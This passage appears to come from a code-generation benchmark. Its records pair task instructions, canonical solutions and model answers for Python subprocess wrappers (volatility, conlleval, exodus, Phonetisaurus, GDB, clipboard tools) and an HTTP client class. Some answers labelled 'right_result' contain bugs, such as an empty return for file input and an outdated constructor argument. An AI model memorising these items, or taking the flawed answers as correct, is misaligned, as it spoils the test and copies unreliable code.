    "right_result": "import subprocess\nimport sys\n\ndef run_and_read(view, cmd):\n    try:\n        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)\n        stdout, stderr = process.communicate()\n        if stdout:\n            return stdout.decode(sys.getdefaultencoding())\n        else:\n            return stderr.decode(sys.getdefaultencoding())\n    except Exception as e:\n        return str(e)\n\ndef filter_region(view, text, command):\n    try:\n        process = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)\n        stdout, stderr = process.communicate(input=text.encode(sys.getdefaultencoding()))\n        if process.returncode == 0:\n            return stdout.decode(sys.getdefaultencoding())\n        else:\n            return stderr.decode(sys.getdefaultencoding())\n    except Exception as e:\n        return str(e)"
  },
  {
    "Task_id": 283,
    "Instruction": "Task Description: Create a function that executes a command in a subprocess using Python's subprocess module, capturing and returning the output and error streams along with the return code.\n\nFunction Description: The function `runvol` executes a given command (constructed from Python interpreter path, volatility script path, and additional arguments) as a subprocess. It captures the standard output, standard error, and return code of the subprocess, then returns these values after printing them for debugging purposes.\n\nInput:\n- `args`: [List[str]] - Additional command-line arguments to pass to the volatility script\n- `volatility`: [str] - Path to the volatility script to be executed\n- `python`: [str] - Path to the Python interpreter to use for execution\n\nOutput:\n- Returns a tuple containing:\n  - `returncode`: [int] - The exit code of the subprocess\n  - `stdout`: [bytes] - The standard output of the subprocess\n  - `stderr`: [bytes] - The standard error of the subprocess",
    "Canonical_solution": "import os\nimport subprocess\nimport sys\n\ndef runvol(args, volatility, python):\n    volpy = volatility\n    python_cmd = python\n\n    cmd = [python_cmd, volpy] + args\n    print(\" \".join(cmd))\n    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    stdout, stderr = p.communicate()\n    print(\"stdout:\")\n    sys.stdout.write(str(stdout))\n    print(\"\")\n    print(\"stderr:\")\n    sys.stdout.write(str(stderr))\n    print(\"\")\n\n    return p.returncode, stdout, stderr",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\n\ndef runvol(args, volatility, python):\n    cmd = [python, volatility] + args\n    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    stdout, stderr = process.communicate()\n    returncode = process.returncode\n    print(stdout.decode(), stderr.decode())\n    return returncode, stdout, stderr"
  },
  {
    "Task_id": 284,
    "Instruction": "Task Description: Write a Python function that executes a Perl script (conlleval) via subprocess to evaluate model scores from a given file and returns the accuracy, precision, recall, and F1 score.\n\nFunction Description: The function uses subprocess.PIPE to create a pipe for inter-process communication with a Perl script. It starts the Perl process, feeds it input from a specified file, captures the output, and parses the results to extract evaluation metrics.\n\nInput:\n- path: str - The file path containing the input data to be evaluated by the Perl script\n\nOutput:\n- tuple[float, float, float, float] - A tuple containing four float values representing accuracy, precision, recall, and F1 score in that order",
    "Canonical_solution": "import subprocess\n\ndef scores(path):\n    bashCommand = 'perl conlleval'\n    process = subprocess.Popen(bashCommand.split(), stdout=subprocess.PIPE,\n                               stdin=open(path))\n    output, error = process.communicate()\n    output = output.decode().split('\\n')[1].split('%; ')\n    output = [out.split(' ')[-1] for out in output]\n    acc, prec, recall, fb1 = tuple(output)\n    return float(acc), float(prec), float(recall), float(fb1)",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\n\ndef evaluate_model(path):\n    with open(path, 'r') as f:\n        input_data = f.read()\n    process = subprocess.Popen(['perl', 'conlleval'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    stdout, stderr = process.communicate(input=input_data.encode())\n    output = stdout.decode()\n    lines = output.strip().split('\\n')\n    last_line = lines[-1]\n    parts = last_line.split()\n    accuracy = float(parts[1])\n    precision = float(parts[3])\n    recall = float(parts[5])\n    f1_score = float(parts[7])\n    return accuracy, precision, recall, f1_score"
  },
  {
    "Task_id": 285,
    "Instruction": "Task Description: Create a function that executes a command-line process (specifically 'exodus') with given arguments and options, handling input/output through pipes, and returning the process's exit code and output streams.\n\nFunction Description: The function `run_exodus` launches an external 'exodus' process with specified arguments and options. It manages inter-process communication using pipes for stdin, stdout, and stderr. The function supports optional stdin input and returns the process's exit code along with captured stdout and stderr outputs.\n\nInput:\n- `args`: [List[str]] - Command-line arguments to pass to the 'exodus' process\n- `**options`: [Dict] - Additional subprocess.Popen options, including:\n  - `stdin`: [str, optional] - Input content to pipe into the process's stdin (encoded as UTF-8)\n  - `universal_newlines`: [bool, optional] - Flag to handle text streams (default: True)\n\nOutput:\n- Tuple containing:\n  - `returncode`: [int] - Exit status of the process\n  - `stdout`: [str] - Captured standard output\n  - `stderr`: [str] - Captured standard error",
    "Canonical_solution": "import os\nimport subprocess\n\ndef run_exodus(args, **options):\n    options['universal_newlines'] = options.get('universal_newlines', True)\n\n    # Allow specifying content to pipe into stdin, with options['stdin']\n    if 'stdin' in options:\n        input = options['stdin'].encode('utf-8')\n        options['stdin'] = subprocess.PIPE\n    else:\n        input = None\n\n    process = subprocess.Popen(\n        ['exodus'] + args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, **options)\n    stdout, stderr = process.communicate(input=input)\n    return process.returncode, stdout, stderr",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\n\ndef run_exodus(args, **options):\n    stdin_input = options.pop('stdin', None)\n    if 'universal_newlines' not in options:\n        options['universal_newlines'] = True\n    process = subprocess.Popen(['exodus'] + args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, **options)\n    stdout, stderr = process.communicate(input=stdin_input)\n    return process.returncode, stdout, stderr"
  },
  {
    "Task_id": 286,
    "Instruction": "Task Description: Implement a class that interfaces with the Phonetisaurus G2P (Grapheme-to-Phoneme) tool to convert words into their phonetic pronunciations using a pre-trained FST (Finite State Transducer) model. The class should handle both single words and lists of words, and provide options for retrieving multiple pronunciation candidates.\n\nClass Description: The PhonetisaurusG2P class provides an interface to the Phonetisaurus G2P tool, allowing for the conversion of words to their phonetic pronunciations using a specified FST model. It supports both single-word and batch processing, with optional n-best results.\n\nAttributes:\n- fst_model: [str] - The file path to the pre-trained FST model used for G2P conversion.\n- nbest: [int/None] - The number of best pronunciation candidates to return for each word (optional).\n- _logger: [logging.Logger] - Logger instance for debugging and error reporting.\n\nMethods:\n- __init__(fst_model=None, nbest=None) -> None - Initializes the G2P converter with the path to the FST model and optional n-best setting.\n- execute(fst_model, input, is_file=False, nbest=None) -> dict - Executes the phonetisaurus-g2p command with the given input and returns the pronunciation results as a dictionary.\n- _translate_word(word) -> dict - Internal method to translate a single word to phonemes.\n- _translate_words(words) -> dict - Internal method to translate a list of words to phonemes using a temporary file.\n- translate(words) -> dict - Main interface method that translates either a single word or a list of words to their phonetic pronunciations.",
    "Canonical_solution": "import os\nimport re\nimport subprocess\nimport tempfile\nimport logging\nimport yaml\n\nclass PhonetisaurusG2P:\n    PATTERN = re.compile(r'^(?P<word>.+)\\t(?P<precision>\\d+\\.\\d+)\\t<s> ' +\n                         r'(?P<pronounciation>.*) </s>', re.MULTILINE)\n\n    def __init__(self, fst_model=None, nbest=None):\n        self._logger = logging.getLogger(__name__)\n        self.fst_model = os.path.abspath(fst_model)\n        self._logger.debug(\"Using FST model: '%s'\", self.fst_model)\n        self.nbest = nbest\n        if self.nbest is not None:\n            self._logger.debug(\"Will use the %d best results.\", self.nbest)\n\n    def execute(self, fst_model, input, is_file=False, nbest=None):\n        cmd = ['phonetisaurus-g2p',\n               '--model=%s' % fst_model,\n               '--input=%s' % input,\n               '--words']\n\n        if is_file:\n            cmd.append('--isfile')\n\n        if nbest is not None:\n            cmd.extend(['--nbest=%d' % nbest])\n\n        cmd = [str(x) for x in cmd]\n        try:\n            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,\n                                    stderr=subprocess.PIPE)\n            stdoutdata, stderrdata = proc.communicate()\n        except OSError:\n            self._logger.error(\"Error occured while executing command '%s'\",\n                             ' '.join(cmd), exc_info=True)\n            raise\n\n        if stderrdata:\n            for line in stderrdata.splitlines():\n                message = line.strip()\n                if message:\n                    self._logger.debug(message)\n\n        if proc.returncode != 0:\n            self._logger.error(\"Command '%s' return with exit status %d\",\n                             ' '.join(cmd), proc.returncode)\n            raise OSError(\"Command execution failed\")\n\n        result = {}\n        if stdoutdata is not None:\n            for word, precision, pronounc in self.PATTERN.findall(stdoutdata):\n                if word not in result:\n                    result[word] = []\n                result[word].append(pronounc)\n        return result\n\n    def _translate_word(self, word):\n        return self.execute(self.fst_model, word, nbest=self.nbest)\n\n    def _translate_words(self, words):\n        with tempfile.NamedTemporaryFile(suffix='.g2p', delete=False) as f:\n            for word in words:\n                f.write(\"%s\\n\" % word)\n            tmp_fname = f.name\n        output = self.execute(self.fst_model, tmp_fname, is_file=True,\n                              nbest=self.nbest)\n        os.remove(tmp_fname)\n        return output\n\n    def translate(self, words):\n        if type(words) is str or len(words) == 1:\n            self._logger.debug('Converting single word to phonemes')\n            output = self._translate_word(words if type(words) is str\n                                          else words[0])\n        else:\n            self._logger.debug('Converting %d words to phonemes', len(words))\n            output = self._translate_words(words)\n        self._logger.debug('G2P conversion returned phonemes for %d words',\n                           len(output))\n        return output",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "right_result": "import logging\nimport os\nimport tempfile\nimport subprocess\nfrom typing import Union, List, Dict\n\nclass PhonetisaurusG2P:\n    def __init__(self, fst_model: str = None, nbest: int = None) -> None:\n        self.fst_model = fst_model\n        self.nbest = nbest\n        self._logger = logging.getLogger(__name__)\n\n    def execute(self, fst_model: str, input_data: Union[str, List[str]], is_file: bool = False, nbest: int = None) -> Dict[str, List[str]]:\n        cmd = [\"phonetisaurus-g2p\", \"--model={}\".format(fst_model), \"--nbest={}\".format(nbest if nbest else self.nbest or 1)]\n        if is_file:\n            cmd.append(\"--input={}\".format(input_data))\n        else:\n            input_str = \"\\n\".join(input_data) if isinstance(input_data, list) else input_data\n            process = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)\n            stdout, stderr = process.communicate(input=input_str)\n            if stderr:\n                self._logger.error(stderr)\n            results = {}\n            for line in stdout.strip().split('\\n'):\n                parts = line.split('\\t')\n                word = parts[0]\n                pron = parts[1]\n                if word not in results:\n                    results[word] = []\n                results[word].append(pron)\n            return results\n        return {}\n\n    def _translate_word(self, word: str) -> Dict[str, List[str]]:\n        return self.execute(self.fst_model, word)\n\n    def _translate_words(self, words: List[str]) -> Dict[str, List[str]]:\n        with tempfile.NamedTemporaryFile(mode='w+', delete=False) as tmpfile:\n            tmpfile.write('\\n'.join(words))\n            tmpfile_path = tmpfile.name\n        result = self.execute(self.fst_model, tmpfile_path, is_file=True)\n        os.remove(tmpfile_path)\n        return result\n\n    def translate(self, words: Union[str, List[str]]) -> Dict[str, List[str]]:\n        if isinstance(words, str):\n            return self._translate_word(words)\n        elif isinstance(words, list) and all(isinstance(word, str) for word in words):\n            return self._translate_words(words)\n        else:\n            raise ValueError(\"Input must be a string or a list of strings\")"
  },
  {
    "Task_id": 287,
    "Instruction": "Task Description: Create a function that inspects the value of a Python object in a running process by its memory address using GDB debugger through subprocess communication.\n\nFunction Description: The function uses GDB to attach to a running Python process and inspect the value of a Python object at a specified memory address. It establishes inter-process communication using subprocess.PIPE to capture GDB's output and parse the result.\n\nInput:\n- pid: [int] - Process ID of the target Python process\n- address: [str/int] - Memory address of the Python object to inspect (can be hex string or integer)\n\nOutput:\n- [str] - The string representation of the inspected Python object as returned by GDB, or None if the address couldn't be resolved",
    "Canonical_solution": "import sys\nimport subprocess\n\nencoding = sys.getdefaultencoding()\n\ndef inspect(pid, address):\n    \"Return the value of an object in a given process at the specified address\"\n    cmd = ' '.join([\n        'gdb --quiet -p %s -batch' % pid,\n        '-eval-command=\"print (PyObject *)%s\"' % address,\n    ])\n    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n    for line in p.communicate()[0].decode(encoding).split('\\n'):\n        if line.startswith('$1 = '):\n            return line[5:]",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\nimport re\n\ndef inspect_python_object(pid, address):\n    if isinstance(address, int):\n        address = hex(address)\n    elif not address.startswith(\"0x\"):\n        address = \"0x\" + address\n\n    cmd = [\"gdb\", \"-p\", str(pid)]\n    gdb_process = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)\n    gdb_cmd = f\"p *(PyObject*){address}\\n\"\n    stdout, _ = gdb_process.communicate(input=gdb_cmd)\n    match = re.search(r\"\\$[0-9]+ = \\{.*\\}\", stdout)\n    return match.group(0) if match else None"
  },
  {
    "Task_id": 288,
    "Instruction": "Task Description: Implement functions to execute system commands and manage subprocesses in Python, allowing for both simple command execution and more controlled process management with input/output handling.\n\nFunction Description: The module provides two main functions for subprocess management: `execute()` for running commands with comprehensive output handling, and `popen()` for creating Popen objects with predefined pipe configurations.\n\nInput:\n- For `execute()`:\n  - cmd: [string/list] - Command to execute (as string or argument list)\n  - shell: [bool, optional] - Whether to use shell execution (default False)\n  - poll_period: [float, optional] - Unused in current implementation\n  - catch_out: [bool, optional] - Whether to capture output (default False)\n  - executable: [string, optional] - Path to executable to use\n  - env: [dict, optional] - Environment variables for subprocess\n\n- For `popen()`:\n  - cmnd: [string] - Command string to execute\n\nOutput:\n- For `execute()`:\n  - Returns tuple: (returncode: int, stdout: bytes/str, stderr: bytes/str)\n  \n- For `popen()`:\n  - Returns: subprocess.Popen object configured with pipes for all streams",
    "Canonical_solution": "import subprocess\nimport shlex\nimport logging\nfrom six import string_types\n\ndef execute(cmd, shell=False, poll_period=1.0, catch_out=False, executable=None, env=None):\n    log = logging.getLogger(__name__)\n    log.info(\"Starting: %s\", cmd)\n\n    stdout = \"\"\n    stderr = \"\"\n\n    if not shell and isinstance(cmd, string_types):\n        cmd = shlex.split(cmd)\n    if not executable:\n        executable = None\n\n    if catch_out:\n        process = subprocess.Popen(\n            cmd,\n            shell=shell,\n            stderr=subprocess.PIPE,\n            stdout=subprocess.PIPE,\n            close_fds=True,\n            env=env,\n            executable=executable,\n        )\n    else:\n        process = subprocess.Popen(cmd, shell=shell, close_fds=True, env=env, executable=executable)\n\n    stdout, stderr = process.communicate()\n    if stderr:\n        log.error(\"There were errors:\\n%s\", stderr)\n\n    if stdout:\n        log.debug(\"Process output:\\n%s\", stdout)\n    returncode = process.returncode\n    log.info(\"Process cmd: %s \u2013 exit code: %s\", cmd, returncode)\n    return returncode, stdout, stderr\n\ndef popen(cmnd):\n    return subprocess.Popen(\n        cmnd,\n        bufsize=0,\n        close_fds=True,\n        shell=True,\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE,\n        stdin=subprocess.PIPE,\n    )",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\nimport sys\n\ndef execute(cmd, shell=False, poll_period=0.1, catch_out=False, executable=None, env=None):\n    if catch_out:\n        stdout = stderr = subprocess.PIPE\n    else:\n        stdout = stderr = None\n\n    process = subprocess.Popen(\n        cmd,\n        shell=shell,\n        executable=executable,\n        env=env,\n        stdout=stdout,\n        stderr=stderr,\n        stdin=subprocess.PIPE\n    )\n\n    stdout_data, stderr_data = process.communicate()\n    \n    if stdout_data is not None:\n        stdout_data = stdout_data.decode(sys.getdefaultencoding())\n    if stderr_data is not None:\n        stderr_data = stderr_data.decode(sys.getdefaultencoding())\n\n    return (process.returncode, stdout_data, stderr_data)\n\ndef popen(cmnd):\n    return subprocess.Popen(\n        cmnd,\n        shell=True,\n        stdin=subprocess.PIPE,\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE\n    )"
  },
  {
    "Task_id": 289,
    "Instruction": "Task Description: Implement functions to retrieve clipboard text content on different operating systems using subprocess pipes for inter-process communication.\n\nFunction Description: The functions use system clipboard utilities through subprocess pipes to get text content from the clipboard, handling platform-specific requirements and text encoding conversions.\n\nInput: None (both functions operate on system clipboard content)\n\nOutput: \n- osx_clipboard_get: Returns str - The decoded text content from macOS clipboard with line endings normalized\n- wayland_clipboard_get: Returns str - The decoded text content from Wayland clipboard, or raises exceptions for non-Wayland environments or missing dependencies\n\nMethods:\n1. osx_clipboard_get() -> str - Retrieves clipboard text on macOS using pbpaste command, converts line endings, and decodes the output\n2. wayland_clipboard_get() -> str - Retrieves clipboard text on Wayland using wl-paste command, with environment checks and error handling",
    "Canonical_solution": "import os\nimport subprocess\nimport IPython.utils.py3compat as py3compat\n\ndef osx_clipboard_get() -> str:\n    \"\"\" Get the clipboard's text on OS X.\n    \"\"\"\n    p = subprocess.Popen(['pbpaste', '-Prefer', 'ascii'],\n        stdout=subprocess.PIPE)\n    bytes_, stderr = p.communicate()\n    # Text comes in with old Mac \\r line endings. Change them to \\n.\n    bytes_ = bytes_.replace(b'\\r', b'\\n')\n    text = py3compat.decode(bytes_)\n    return text\n\ndef wayland_clipboard_get():\n    \"\"\"Get the clipboard's text under Wayland using wl-paste command.\n\n    This requires Wayland and wl-clipboard installed and running.\n    \"\"\"\n    if os.environ.get(\"XDG_SESSION_TYPE\") != \"wayland\":\n        raise TryNext(\"wayland is not detected\")\n\n    try:\n        with subprocess.Popen([\"wl-paste\"], stdout=subprocess.PIPE) as p:\n            raw, err = p.communicate()\n            if p.wait():\n                raise TryNext(err)\n    except FileNotFoundError as e:\n        raise TryNext(\n            \"Getting text from the clipboard under Wayland requires the wl-clipboard \"\n            \"extension: https://github.com/bugaevc/wl-clipboard\"\n        ) from e\n\n    if not raw:\n        raise ClipboardEmpty\n\n    try:\n        text = py3compat.decode(raw)\n    except UnicodeDecodeError as e:\n        raise ClipboardEmpty from e\n\n    return text",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\nimport sys\nimport os\n\ndef osx_clipboard_get() -> str:\n    p = subprocess.Popen(['pbpaste'], stdout=subprocess.PIPE)\n    content, _ = p.communicate()\n    return content.decode('utf-8', 'replace').replace('\\r\\n', '\\n').replace('\\r', '\\n')\n\ndef wayland_clipboard_get() -> str:\n    if 'WAYLAND_DISPLAY' not in os.environ:\n        raise EnvironmentError('Not running in a Wayland environment')\n    \n    try:\n        p = subprocess.Popen(['wl-paste'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        content, err = p.communicate()\n        \n        if p.returncode != 0:\n            raise RuntimeError(f'wl-paste failed: {err.decode(\"utf-8\", \"replace\")}')\n            \n        return content.decode('utf-8', 'replace')\n    except FileNotFoundError:\n        raise ImportError('wl-paste command not found. Make sure it is installed and available in PATH')"
  },
  {
    "Task_id": 29,
    "Instruction": "Task Description: Implement a robust HTTP client class in Python that handles both HTTP and HTTPS connections, supports proxy configuration, and manages connection timeouts and keep-alive settings.\n\nClass Description: The MNSHttp class provides a wrapper around Python's http.client module to handle HTTP/HTTPS requests with additional features like proxy support, connection timeout management, and keep-alive functionality.\n\nAttributes:\n- host: str - The target server hostname or IP address\n- is_https: bool - Flag indicating whether to use HTTPS (True) or HTTP (False)\n- connection_timeout: int - Connection timeout in seconds (default: 60)\n- keep_alive: bool - Flag for maintaining persistent connections (default: True)\n- request_size: int - Tracks the size of the last request sent\n- response_size: int - Tracks the size of the last response received\n- logger: Logger - Optional logger for debugging information\n- proxy: str - Optional proxy server configuration\n- conn: HTTPConnection/HTTPSConnection - The active connection object\n\nMethods:\n- __init__(host, connection_timeout=60, keep_alive=True, logger=None, is_https=False) -> None - Initializes the HTTP client with connection parameters\n- _new_conn() -> HTTPConnection/HTTPSConnection - Creates a new connection object based on current configuration\n- _basic_auth_str(username, password) -> str - Generates Basic Auth header string\n- get_env_proxy() -> str - Retrieves proxy configuration from environment variables\n- set_connection_timeout(connection_timeout) -> None - Updates the connection timeout and recreates the connection if needed\n- send_request(req_inter) -> ResponseInternal - Sends an HTTP request and returns the response, handling proxy configuration and connection management\n\nHelper Classes:\n- MNSHTTPConnection(host, port=None, strict=None, connection_timeout=60) - Custom HTTP connection with timeout support and request size tracking\n- MNSHTTPSConnection(host, port=None) - Custom HTTPS connection with request size tracking\n\nBoth connection classes extend their respective http.client counterparts and add:\n- request_length tracking\n- Custom connect() implementation for MNSHTTPConnection with timeout support\n- Overridden send() method to track request size\n- Standardized request() method initialization",
    "Canonical_solution": "import base64\nimport socket\nfrom http.client import HTTPConnection, BadStatusLine, HTTPSConnection\nfrom urllib.parse import urlparse, unquote\nimport os\n\nclass MNSHttp:\n    def __init__(self, host, connection_timeout=60, keep_alive=True, logger=None, is_https=False):\n        self.host = host\n        self.is_https = is_https\n        self.connection_timeout = connection_timeout\n        self.keep_alive = keep_alive\n        self.request_size = 0\n        self.response_size = 0\n        self.logger = logger\n        self.proxy = None\n        self.conn = self._new_conn()\n        if self.logger:\n            self.logger.info(\"InitMNSHttp KeepAlive:%s ConnectionTime:%s\" % (self.keep_alive, self.connection_timeout))\n\n    def _new_conn(self):\n        if self.is_https:\n            return MNSHTTPSConnection(self.host)\n        else:\n            return MNSHTTPConnection(self.host, connection_timeout=self.connection_timeout)\n\n    def _basic_auth_str(self, username, password):\n        if isinstance(username, str):\n            username = username.encode()\n        if isinstance(password, str):\n            password = password.encode()\n        return 'Basic ' + base64.b64encode(b':'.join((username, password))).strip().decode()\n\n    def get_env_proxy(self):\n        if self.is_https:\n            return os.getenv('https_proxy') or os.getenv('HTTPS_PROXY')\n        else:\n            return os.getenv('http_proxy') or os.getenv('HTTP_PROXY')\n\n    def set_connection_timeout(self, connection_timeout):\n        self.connection_timeout = connection_timeout\n        if not self.is_https:\n            if self.conn:\n                self.conn.close()\n            self.conn = MNSHTTPConnection(self.host, connection_timeout=connection_timeout)\n\n    def send_request(self, req_inter):\n        try:\n            if self.logger:\n                self.logger.debug(\"SendRequest %s\" % req_inter)\n\n            proxy = self.get_env_proxy()\n            if proxy:\n                url = urlparse(proxy)\n                self.conn.close()\n                if url.username:\n                    req_inter.header['Proxy-Authorization'] = self._basic_auth_str(unquote(url.username), unquote(url.password))\n                if self.is_https:\n                    self.conn = MNSHTTPSConnection(url.hostname, url.port)\n                else:\n                    self.conn = MNSHTTPConnection(url.hostname, url.port, connection_timeout=self.connection_timeout)\n                self.conn.set_tunnel(self.host, headers=req_inter.header)\n            else:\n                if self.conn.host != self.host:\n                    self.conn.close()\n                    self.conn = self._new_conn()\n\n            self.conn.request(req_inter.method, 'http://%s%s' % (self.host, req_inter.uri), req_inter.data, req_inter.header)\n            self.conn.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)\n            try:\n                http_resp = self.conn.getresponse()\n            except BadStatusLine:\n                self.conn.close()\n                self.conn.request(req_inter.method, req_inter.uri, req_inter.data, req_inter.header)\n                self.conn.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)\n                http_resp = self.conn.getresponse()\n            \n            headers = dict(http_resp.getheaders())\n            resp_inter = ResponseInternal(status=http_resp.status, header=headers, data=http_resp.read())\n            self.request_size = self.conn.request_length\n            self.response_size = len(resp_inter.data)\n            \n            if not self.is_keep_alive():\n                self.conn.close()\n            if self.logger:\n                self.logger.debug(\"GetResponse %s\" % resp_inter)\n            return resp_inter\n        except Exception as e:\n            self.conn.close()\n            raise MNSClientNetworkException(\"NetWorkException\", str(e), req_inter.get_req_id())\n\nclass MNSHTTPConnection(HTTPConnection):\n    def __init__(self, host, port=None, strict=None, connection_timeout=60):\n        HTTPConnection.__init__(self, host, port, strict)\n        self.request_length = 0\n        self.connection_timeout = connection_timeout\n\n    def send(self, str):\n        HTTPConnection.send(self, str)\n        self.request_length += len(str)\n\n    def request(self, method, url, body=None, headers={}):\n        self.request_length = 0\n        HTTPConnection.request(self, method, url, body, headers)\n\n    def connect(self):\n        msg = \"getaddrinfo returns an empty list\"\n        for res in socket.getaddrinfo(self.host, self.port, 0, socket.SOCK_STREAM):\n            af, socktype, proto, canonname, sa = res\n            try:\n                self.sock = socket.socket(af, socktype, proto)\n                self.sock.settimeout(self.connection_timeout)\n                self.sock.connect(sa)\n            except socket.error as msg:\n                if self.sock:\n                    self.sock.close()\n                self.sock = None\n                continue\n            break\n        if not self.sock:\n            raise socket.error(msg)\n\nclass MNSHTTPSConnection(HTTPSConnection):\n    def __init__(self, host, port=None):\n        HTTPSConnection.__init__(self, host, port)\n        self.request_length = 0\n\n    def send(self, str):\n        HTTPSConnection.send(self, str)\n        self.request_length += len(str)\n\n    def request(self, method, url, body=None, headers={}):\n        self.request_length = 0\n        HTTPSConnection.request(self, method, url, body, headers)",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "right_result": "import http.client\nimport os\nimport socket\nimport base64\nimport logging\nfrom urllib.parse import urlparse\n\nclass ResponseInternal:\n    def __init__(self, status, reason, headers, body):\n        self.status = status\n        self.reason = reason\n        self.headers = headers\n        self.body = body\n\nclass MNSHTTPConnection(http.client.HTTPConnection):\n    def __init__(self, host, port=None, strict=None, connection_timeout=60):\n        super().__init__(host, port, strict)\n        self.connection_timeout = connection_timeout\n        self.request_length = 0\n\n    def connect(self):\n        msg = \"getaddrinfo returns an empty list\"\n        for res in socket.getaddrinfo(self.host, self.port, 0, socket.SOCK_STREAM):\n            af, socktype, proto, canonname, sa = res\n            try:\n                self.sock = socket.socket(af, socktype, proto)\n                self.sock.settimeout(self.connection_timeout)\n                self.sock.connect(sa)\n            except socket.error as e:\n                if self.sock:\n                    self.sock.close()\n                self.sock = None\n                continue\n            break\n        if not self.sock:\n            raise socket.error(msg)\n\n    def send(self, data):\n        self.request_length = len(data)\n        return super().send(data)\n\nclass MNSHTTPSConnection(http.client.HTTPSConnection):\n    def __init__(self, host, port=None, key_file=None, cert_file=None):\n        super().__init__(host, port, key_file, cert_file)\n        self.request_length = 0\n\n    def send(self, data):\n        self.request_length = len(data)\n        return super().send(data)\n\nclass MNSHttp:\n    def __init__(self, host, connection_timeout=60, keep_alive=True, logger=None, is_https=False):\n        self.host = host\n        self.is_https = is_https\n        self.connection_timeout = connection_timeout\n        self.keep_alive = keep_alive\n        self.request_size = 0\n        self.response_size = 0\n        self.logger = logger or logging.getLogger(__name__)\n        self.proxy = self.get_env_proxy()\n        self.conn = self._new_conn()\n\n    def _new_conn(self):\n        if self.proxy and not self.is_https:\n            proxy_parsed = urlparse('//' + self.proxy)\n            proxy_host, proxy_port = proxy_parsed.hostname, proxy_parsed.port\n            conn_host = f\"{proxy_host}:{proxy_port}\" if proxy_port else proxy_host\n            conn = MNSHTTPConnection(conn_host, connection_timeout=self.connection_timeout)\n        else:\n            if self.is_https:\n                conn = MNSHTTPSConnection(self.host, 443)\n            else:\n                conn = MNSHTTPConnection(self.host, 80, connection_timeout=self.connection_timeout)\n        return conn\n\n    @staticmethod\n    def _basic_auth_str(username, password):\n        auth_str = f\"{username}:{password}\".encode('utf-8')\n        encoded_auth = base64.b64encode(auth_str).decode('utf-8')\n        return f\"Basic {encoded_auth}\"\n\n    def get_env_proxy(self):\n        return os.environ.get('http_proxy') or os.environ.get('HTTP_PROXY')\n\n    def set_connection_timeout(self, connection_timeout):\n        self.connection_timeout = connection_timeout\n        if not isinstance(self.conn, MNSHTTPSConnection):\n            self.conn.connection_timeout = connection_timeout\n\n    def send_request(self, req_inter):\n        headers = req_inter.get('headers', {})\n        body = req_inter.get('body', '')\n        method = req_inter.get('method', 'GET')\n        path = req_inter.get('path', '/')\n\n        if self.proxy and not self.is_https:\n            full_url = (\"https://\" if self.is_https else \"http://\") + self.host + path\n        else:\n            full_url = path\n\n        try:\n            self.conn.request(method, full_url, body=body, headers=headers)\n            response = self.conn.getresponse()\n            resp_body = response.read()\n            \n            self.request_size = getattr(self.conn, 'request_length', 0)\n            self.response_size = len(resp_body)\n            \n            if not self.keep_alive:\n                self.conn.close()\n                \n            return ResponseInternal(response.status, response.reason, response.headers, resp_body)\n        except Exception as e:\n            self.logger.error(f\"Request failed: {str(e)}\")\n            raise"
  },
  {
    "Task_id": 290,
    "Instruction": "Task Description: Implement a class that interfaces with the Phonetisaurus G2P (Grapheme-to-Phoneme) tool to convert words to their phonetic pronunciations using a pre-trained FST (Finite State Transducer) model.\n\nClass Description: The PhonetisaurusG2P class provides an interface to the Phonetisaurus G2P tool, allowing for the conversion of words or files containing words to their phonetic pronunciations. It handles process execution, error logging, and output parsing.\n\nAttributes:\n- fst_model: [str] - The file path to the pre-trained FST model used for grapheme-to-phoneme conversion.\n- nbest: [int/None] - The number of best pronunciations to return for each word. If None, only the top pronunciation is returned.\n- _logger: [logging.Logger] - A logger instance for debugging and error logging.\n\nMethods:\n- __init__(fst_model=None, nbest=None) -> [None] - Initializes the PhonetisaurusG2P instance with the path to the FST model and the number of best pronunciations to return.\n  - Input Parameters:\n    - fst_model: [str] - Path to the FST model file.\n    - nbest: [int/None] - Number of best pronunciations to return (default: None).\n  - Return Type: None\n\n- execute(input, is_file=False) -> [dict] - Executes the Phonetisaurus G2P tool to convert the input word or file to phonetic pronunciations.\n  - Input Parameters:\n    - input: [str] - The input word or file path containing words to be converted.\n    - is_file: [bool] - Flag indicating whether the input is a file (default: False).\n  - Return Type: dict - A dictionary where keys are words and values are lists of pronunciations. Each pronunciation is a string.\n  - Description: This method uses subprocess.Popen to run the Phonetisaurus G2P tool, captures stdout and stderr, parses the output, and returns the results in a structured format. Errors are logged, and exceptions are raised for execution failures.",
